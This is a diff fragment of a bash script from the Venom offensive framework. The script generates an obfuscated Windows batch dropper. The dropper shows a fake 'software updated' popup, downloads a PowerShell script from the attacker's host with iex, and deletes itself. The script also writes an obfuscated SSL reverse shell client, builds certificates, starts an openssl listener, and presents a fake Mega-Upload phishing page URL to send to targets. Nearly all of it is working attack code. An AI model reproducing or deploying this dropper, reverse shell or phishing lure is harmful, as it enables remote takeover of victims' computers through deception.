    echo "</script>" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
-   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} SE:${YellowF} $SE";fi
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} SE:${YellowF} $SE"
+
 else
-   echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
-   echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
+   echo ":: Framework: Venom v1.0.17 - shinigami" > $IPATH/output/$Drop.$Ext
    echo "@echo off&%@i%&ti%@_$%tl^e p%_?%l%@#%ay.go%@i%og%'$%le.co%_[-1]%m - %_$%Up%@$%dat%@Q%in%_$%g S%@$%of%@i%twa%U1%re %_$%Rep%@%osi%@%tor%@%ie%('$')%s." >> $IPATH/output/$Drop.$Ext
    echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D %@$%IS_MIN%@$%IMI%,;f%ZE%i?%D se%@'$%t IS_MIN%_#t%IM%'$%IZ%@=i%ED=1 &%@_$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
-   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
+   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
    echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
    echo "@Ti%@i%m^Eo%(0)%U^t /%@l%T 2 >n%_spawn_%U%R%L &%@$%& D^e%d0b@%L /F /%@$%Q $Drop.$Ext" >> $IPATH/output/$Drop.$Ext # <-- delete script at the end of execution
    echo "=Exit" >> $IPATH/output/$Drop.$Ext
@@ -13955,24 +13984,25 @@ SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
 syscallvar2="\$$SysCall2"
 
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
-echo "<#" > $IPATH/output/Client.ps1
-echo "Obfuscated Reverse TCP OpenSSL Shell" >> $IPATH/output/Client.ps1
-echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
-echo "#>" >> $IPATH/output/Client.ps1
+echo "" > $IPATH/output/Client.ps1
+echo "\$SSLStreamTls = \"gnidocnEiicsA.txeT.metsyS\";" >> $IPATH/output/Client.ps1
+echo "\$CharArray = \$SSLStreamTls.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "[Array]::Reverse(\$CharArray);" >> $IPATH/output/Client.ps1
+echo "$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$Certificate = \$Vault.ToCharArray();[Array]::Reverse(\$Certificate);" >> $IPATH/output/Client.ps1
-echo "$syscallvar = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/Client.ps1
-echo "[Array]::Reverse(\$CharArray);$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
+echo "\$VoidBuff = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/Client.ps1
+echo "\$Cert = \$VoidBuff.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "[Array]::Reverse(\$Cert);" >> $IPATH/output/Client.ps1
+echo "$syscallvar = (\$Cert -Join '');" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
 echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
 echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
-echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
-echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
+echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
@@ -14000,7 +14030,7 @@ else
    days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
 fi
 
-xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
+gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
 if [ -e cert.pem ]; then
    echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
 else
@@ -14038,21 +14068,20 @@ cd $IPATH/output
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
 echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
-   echo "${BlueF}- ATTACK VECTOR  : http://$lhost/MegaUpload.html"
-   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}- ATTACK VECTOR  : http://$lhost/$Drop.zip";fi
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
 else
-   echo "${BlueF}- ATTACK VECTOR  : http://$lhost/Download.html"
-   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}- ATTACK VECTOR  : http://$lhost/$Drop.zip";fi
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
 fi
-   echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
-xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+#x term -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+gnome-terminal --title="OPENSSL LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1
 cd $IPATH
 sleep 2
 
